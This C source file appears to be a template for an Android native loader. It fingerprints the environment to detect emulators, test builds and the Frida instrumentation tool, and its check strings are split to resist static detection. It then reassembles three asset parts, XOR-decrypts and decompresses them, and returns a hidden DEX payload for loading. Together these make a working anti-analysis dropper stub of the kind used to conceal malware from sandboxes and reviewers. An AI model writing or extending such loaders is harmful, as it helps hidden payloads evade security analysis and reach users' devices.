#include <jni.h>
#include <string.h>
#include <stdlib.h>
#include <android/asset_manager.h>
#include <android/asset_manager_jni.h>
#include <zlib.h>
#include <sys/system_properties.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>

static const unsigned char KEY[32] = {
    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0
}; // KEY_PLACEHOLDER

#define PAYLOAD_PART_0 "PART0_PATH_PLACEHOLDER"
#define PAYLOAD_PART_1 "PART1_PATH_PLACEHOLDER"
#define PAYLOAD_PART_2 "PART2_PATH_PLACEHOLDER"

static int lc_file_exists(const char* path) {
    struct stat st;
    return stat(path, &st) == 0;
}

static void lc_cat2(char* out, size_t sz, const char* a, const char* b) {
    snprintf(out, sz, "%s%s", a, b);
}

static int lc_prop_ci(const char* key, const char* needle) {
    char val[PROP_VALUE_MAX];
    if (__system_property_get(key, val) <= 0) return 0;
    const char* p = val;
    size_t nlen = strlen(needle);
    while (*p) {
        size_t i = 0;
        while (i < nlen && p[i] && (p[i] | 32) == (needle[i] | 32)) i++;
        if (i == nlen) return 1;
        p++;
    }
    return 0;
}

static int lc_frida_port(int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 0;
    struct timeval tv;
    tv.tv_sec = 0; tv.tv_usec = 150000;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons((uint16_t)port);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    int r = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    close(sock);
    return r == 0;
}

static int lc_cpuinfo_has(const char* needle) {
    char path[32]; lc_cat2(path, sizeof(path), "/proc/", "cpuinfo");
    FILE* f = fopen(path, "r");
    if (!f) return 0;
    char line[256]; int found = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, needle)) { found = 1; break; }
    }
    fclose(f);
    return found;
}

static int lite_env_check(void) {
    char p1[64], p2[64];

    lc_cat2(p1, sizeof(p1), "ro.ker", "nel.qemu");
    if (lc_prop_ci(p1, "1")) return 1;

    lc_cat2(p1, sizeof(p1), "ro.hard", "ware");
    if (lc_prop_ci(p1, "gold" "fish"))  return 1;
    if (lc_prop_ci(p1, "ran" "chu"))    return 1;

    lc_cat2(p1, sizeof(p1), "ro.product", ".model");
    if (lc_prop_ci(p1, "sdk"))          return 1;
    if (lc_prop_ci(p1, "emulator"))     return 1;
    if (lc_prop_ci(p1, "android sdk"))  return 1;

    lc_cat2(p1, sizeof(p1), "ro.product", ".board");
    if (lc_prop_ci(p1, "gold" "fish"))  return 1;

    lc_cat2(p1, sizeof(p1), "ro.product", ".brand");
    lc_cat2(p2, sizeof(p2), "ro.product", ".manufacturer");
    if (lc_prop_ci(p1, "generic") && lc_prop_ci(p2, "generic")) return 3;

    lc_cat2(p1, sizeof(p1), "ro.build", ".flavor");
    if (lc_prop_ci(p1, "sdk_"))         return 1;

    lc_cat2(p1, sizeof(p1), "ro.build", ".tags");
    if (lc_prop_ci(p1, "test-keys"))    return 3;

    lc_cat2(p1, sizeof(p1), "ro.boot", ".qemu");
    if (lc_prop_ci(p1, "1"))            return 1;

    lc_cat2(p1, sizeof(p1), "/dev/socket/", "qemud");
    if (lc_file_exists(p1))             return 1;
    lc_cat2(p1, sizeof(p1), "/dev/", "qemu_pipe");
    if (lc_file_exists(p1))             return 1;
    lc_cat2(p1, sizeof(p1), "/dev/", "vboxguest");
    if (lc_file_exists(p1))             return 1;
    lc_cat2(p1, sizeof(p1), "/dev/", "goldfish_pipe");
    if (lc_file_exists(p1))             return 1;

    if (lc_cpuinfo_has("QEMU"))         return 1;
    if (lc_cpuinfo_has("gold" "fish"))  return 1;

    {
        char brand[PROP_VALUE_MAX] = {0};
        char fp[PROP_VALUE_MAX]    = {0};
        lc_cat2(p1, sizeof(p1), "ro.product", ".brand");
        lc_cat2(p2, sizeof(p2), "ro.build.",  "fingerprint");
        __system_property_get(p1, brand);
        __system_property_get(p2, fp);

        if (fp[0]) {
            if (strstr(fp, "IN2023") && strstr(fp, "QKR1.191246.002")) return 3;
            if (strstr(fp, "eng." "root") || strstr(fp, "eng." "build")) return 3;
            size_t blen = strlen(brand);
            if (blen > 1 && (strncasecmp(fp, brand, blen) != 0 || fp[blen] != '/')) return 3;
        }
    }

    {
        double uptime = -1.0;
        FILE* uf = fopen("/proc/uptime", "r");
        if (uf) { fscanf(uf, "%lf", &uptime); fclose(uf); }
        if (uptime > 0.0 && uptime < 90.0) return 3;
    }

    lc_cat2(p1, sizeof(p1), "/data/local/tmp/", "frida-server");
    if (lc_file_exists(p1))             return 2;
    lc_cat2(p1, sizeof(p1), "/data/local/tmp/", "re.frida.server");
    if (lc_file_exists(p1))             return 2;
    if (lc_frida_port(27042))           return 2;
    if (lc_frida_port(27043))           return 2;

    return 0;
}

JNIEXPORT jint JNICALL
DEXLDR_JNI_LITE_CHECK_PLACEHOLDER(JNIEnv* env, jobject thiz) {
    (void)env; (void)thiz;
    return (jint)lite_env_check();
}

JNIEXPORT jbyteArray JNICALL
DEXLDR_JNI_SYMBOL_PLACEHOLDER(JNIEnv* env, jobject thiz) {
    jclass appCls = (*env)->GetObjectClass(env, thiz);
    if (!appCls) return NULL;
    jmethodID getAssetsM = (*env)->GetMethodID(env, appCls, "getAssets",
        "()Landroid/content/res/AssetManager;");
    if (!getAssetsM) return NULL;
    jobject jAssets = (*env)->CallObjectMethod(env, thiz, getAssetsM);
    if (!jAssets) return NULL;

    AAssetManager* mgr = AAssetManager_fromJava(env, jAssets);
    if (!mgr) return NULL;

    const char* parts[3] = { PAYLOAD_PART_0, PAYLOAD_PART_1, PAYLOAD_PART_2 };
    unsigned char* partBufs[3] = { NULL, NULL, NULL };
    size_t partSizes[3] = { 0, 0, 0 };
    size_t encLen = 0;

    for (int pi = 0; pi < 3; pi++) {
        AAsset* pa = AAssetManager_open(mgr, parts[pi], AASSET_MODE_BUFFER);
        if (!pa) { for (int k=0;k<pi;k++) free(partBufs[k]); return NULL; }
        off_t psz = AAsset_getLength(pa);
        if (psz <= 0) { AAsset_close(pa);
                        for (int k=0;k<pi;k++) free(partBufs[k]); return NULL; }
        partBufs[pi] = (unsigned char*) malloc((size_t)psz);
        if (!partBufs[pi]) { AAsset_close(pa);
                             for (int k=0;k<pi;k++) free(partBufs[k]); return NULL; }
        int rd = AAsset_read(pa, partBufs[pi], (size_t)psz);
        AAsset_close(pa);
        if (rd != (int)psz) { for (int k=0;k<=pi;k++) free(partBufs[k]); return NULL; }
        partSizes[pi] = (size_t)psz;
        encLen += (size_t)psz;
    }

    unsigned char* encBuf = (unsigned char*) malloc(encLen);
    if (!encBuf) { for (int k=0;k<3;k++) free(partBufs[k]); return NULL; }
    size_t off = 0;
    for (int pi = 0; pi < 3; pi++) {
        memcpy(encBuf + off, partBufs[pi], partSizes[pi]);
        off += partSizes[pi];
        free(partBufs[pi]);
    }

    size_t klen = sizeof(KEY);
    for (size_t i = 0; i < (size_t)encLen; i++) {
        encBuf[i] ^= KEY[i % klen];
    }

    uLongf dexLen = (uLongf)encLen * 6;
    unsigned char* dexBuf = NULL;
    int zret = Z_BUF_ERROR;
    while (zret == Z_BUF_ERROR) {
        free(dexBuf);
        dexBuf = (unsigned char*) malloc(dexLen);
        if (!dexBuf) { free(encBuf); return NULL; }

        z_stream strm;
        memset(&strm, 0, sizeof(strm));
        strm.next_in   = encBuf;
        strm.avail_in  = (uInt)encLen;
        strm.next_out  = dexBuf;
        strm.avail_out = (uInt)dexLen;

        if (inflateInit2(&strm, 47) != Z_OK) {
            free(dexBuf); free(encBuf); return NULL;
        }
        zret = inflate(&strm, Z_FINISH);
        dexLen = strm.total_out;
        inflateEnd(&strm);

        if (zret == Z_BUF_ERROR) {
            dexLen = (uLongf)(strm.total_out + encLen * 4);
        }
    }
    free(encBuf);

    if (zret != Z_STREAM_END) {
        free(dexBuf); return NULL;
    }

    jbyteArray result = (*env)->NewByteArray(env, (jsize)dexLen);
    if (!result) { free(dexBuf); return NULL; }
    (*env)->SetByteArrayRegion(env, result, 0, (jsize)dexLen, (jbyte*)dexBuf);

    memset(dexBuf, 0, dexLen);
    free(dexBuf);
    return result;
}
